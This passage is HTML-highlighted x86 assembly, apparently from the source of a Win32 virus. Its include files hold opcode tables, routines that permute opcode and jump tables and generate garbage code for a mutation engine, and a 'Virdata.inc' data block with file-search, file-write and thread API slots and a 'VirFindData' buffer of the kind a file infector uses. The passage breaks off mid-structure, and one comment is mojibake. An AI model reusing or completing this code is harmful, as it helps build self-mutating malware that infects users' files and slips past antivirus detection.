    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc0">   </span><span class="sc1">; MOV (E)AX,mem16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataReturn1</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc0">           </span><span class="sc1">; LES/LDS</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C6h</span><span class="sc0">                </span><span class="sc1">; MOV mem,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C7h</span><span class="sc0">                </span><span class="sc1">; MOV mem,imm16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">           </span><span class="sc1">; SHL/ROL/ROR ...,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">     </span><span class="sc1">; SHL/.... ,1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">      </span><span class="sc1">; SHL/.... ,CL</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">         </span><span class="sc1">; MOV r/m,im16,etc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc2">8Eh</span><span class="sc0">             </span><span class="sc1">; MOV r/m,seg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">      </span><span class="sc1">; MOV seg,r/m</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">             </span><span class="sc1">; POP r/m,LEA reg,r/m</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">69h</span><span class="sc0">             </span><span class="sc1">; imul r/m,im16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Bh</span><span class="sc0">             </span><span class="sc1">; imul r/m,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">         </span><span class="sc1">; TEST/XCHG r8(16)(32),r/m</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">; ArOp r/m,r16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataReturn1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xOpcode</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Tables.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Procedures needed to permutate opcode tables(and/or jump tables)</span><span class="sc0">

</span><span class="sc5">MaxTbls</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">

</span><span class="sc5">TravelOpTable</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Traveled</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tbln</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TravelOpTable</span><span class="sc0">
</span><span class="sc5">Traveled</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TravelOpTable</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">TravelJmpTable</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tbln</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">TravelJmpTable</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TravelJmpTable</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CheckTblAddr</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ESi - Addr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Tbln</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">TData</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Tbls</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">TCheckData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TxPoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">TxPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TPoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">TPoint</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">TCheckData</span><span class="sc0">
</span><span class="sc5">TData</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckTblAddr</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">PatchTblData</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Tbln</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoJmp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Tbls</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DataTblPatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

</span><span class="sc1">;   sub eax,[xDst][ebp]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DataTblPatch</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchTblData</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">user.inc</span><span class="sc0"> </span><span class="sc4">]----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; User procedures. Currently just one procedure, that initialises table</span><span class="sc0">
</span><span class="sc1">; permutation.</span><span class="sc0">

</span><span class="sc5">UserProc_InitTables</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Tbls</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">VTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VTbll</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TravelJmpTable</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">GarbTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">GarbLen</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TravelJmpTable</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">OpTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TravelOpTable</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">DataTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TravelOpTable</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">MutTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TravelOpTable</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UserProc_InitTables</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Virdata.inc</span><span class="sc0"> </span><span class="sc4">]-------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CreateFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FSeek</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">imnum</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; ?R&lt;ð§?¡¢÷R ð¿ôR ¢ð £?¿«¥ ¤£-ò¦ðc</span><span class="sc0">

</span><span class="sc5">VirFindData</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwReserved0</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwReserved1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">cFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">sects</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">free</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">need</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">win32.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">UCHAR</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">USHORT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">; used only if we really need 16 bits</span><span class="sc0">
</span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">; 32 bits for WIN32</span><span class="sc0">
</span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;*******************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Rectangle</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*******************************************************************</span><span class="sc0">

</span><span class="sc5">RECT</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">
        </span><span class="sc5">rcLeft</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">rcTop</span><span class="sc0">           </span><span class="sc5">UINT</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">rcRight</span><span class="sc0">         </span><span class="sc5">UINT</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">rcBottom</span><span class="sc0">        </span><span class="sc5">UINT</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RECT</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;*******************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Window Class structure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*******************************************************************</span><span class="sc0">

</span><span class="sc5">WNDCLASS</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
        </span><span class="sc5">clsStyle</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; class style</span><span class="sc0">
        </span><span class="sc5">clsLpfnWndProc</span><span class="sc0">    </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsCbClsExtra</span><span class="sc0">     </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsCbWndExtra</span><span class="sc0">     </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsHInstance</span><span class="sc0">      </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; instance handle</span><span class="sc0">
        </span><span class="sc5">clsHIcon</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; class icon handle</span><span class="sc0">
        </span><span class="sc5">clsHCursor</span><span class="sc0">        </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; class cursor handle</span><span class="sc0">
        </span><span class="sc5">clsHbrBackground</span><span class="sc0">  </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; class background brush</span><span class="sc0">
        </span><span class="sc5">clsLpszMenuName</span><span class="sc0">   </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; menu name</span><span class="sc0">
        </span><span class="sc5">clsLpszClassName</span><span class="sc0">  </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; far ptr to class name</span><span class="sc0">
</span><span class="sc5">WNDCLASS</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">PAINTSTRUCT</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">PShdc</span><span class="sc0">         </span><span class="sc5">UINT</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">PSfErase</span><span class="sc0">      </span><span class="sc5">UINT</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">PSrcPaint</span><span class="sc0">     </span><span class="sc5">UCHAR</span><span class="sc0">            </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">RECT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">PSfRestore</span><span class="sc0">    </span><span class="sc5">UINT</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">PSfIncUpdate</span><span class="sc0">  </span><span class="sc5">UINT</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">PSrgbReserved</span><span class="sc0"> </span><span class="sc5">UCHAR</span><span class="sc0">            </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PAINTSTRUCT</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">MSGSTRUCT</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">msHWND</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msMESSAGE</span><span class="sc0">       </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msWPARAM</span><span class="sc0">        </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msLPARAM</span><span class="sc0">        </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msTIME</span><span class="sc0">          </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msPT</span><span class="sc0">            </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MSGSTRUCT</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">MINMAXINFO</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
